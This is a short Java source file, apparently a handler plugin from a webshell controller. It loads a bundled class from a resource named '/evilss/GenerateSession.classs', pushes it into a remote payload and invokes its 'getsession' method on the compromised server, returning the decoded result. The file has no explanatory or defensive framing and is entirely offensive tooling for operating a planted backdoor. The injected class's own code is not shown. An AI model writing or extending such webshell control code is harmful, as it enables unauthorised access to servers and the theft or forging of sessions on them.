package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class GenerateSessionHandler extends HandlerBase{
    public String handler() {
        this.payload.include("GenerateSession", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/GenerateSession.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("GenerateSession", "getsession", reqParameter));
    }
}
